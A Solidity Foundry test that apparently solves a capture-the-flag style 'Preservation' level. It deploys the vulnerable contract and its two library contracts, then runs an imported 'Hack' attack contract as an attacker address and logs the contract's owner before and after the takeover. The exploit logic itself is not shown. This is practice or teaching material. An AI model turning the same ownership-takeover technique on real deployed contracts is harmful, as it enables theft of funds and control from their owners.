// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Attacks/PreservationAttack.sol";
import "../src/Preservation/Preservation.sol";
import "../src/Preservation/LibraryContract.sol";

import "forge-std/Test.sol";
import "forge-std/console.sol";

contract PreservationTest is Test {
    LibraryContract timeZone1Library;
    LibraryContract timeZone2Library;

    Preservation preservation;
    Hack preservationAttack;

    address deployer = makeAddr("deployer");
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.startPrank(deployer);
        timeZone1Library = new LibraryContract();
        timeZone2Library = new LibraryContract();
        preservation = new Preservation(address(timeZone1Library),address(timeZone2Library));
        vm.stopPrank();
    }

    function test_exploit() public {
        console.log("Before exploit");
        console.log("-----------------------------------");
        console.log("deployer address: ",deployer);
        console.log("owner of the preservation: ", preservation.owner());
        vm.startPrank(attacker);
        preservationAttack = new Hack();
        preservationAttack.attack(address(preservation));
        vm.stopPrank();

        console.log("After exploit");
        console.log("-----------------------------------");
        console.log("deployer address: ",deployer);
        console.log("attacker address: ",attacker );
        console.log("owner of the preservation: ", preservation.owner());
    }

}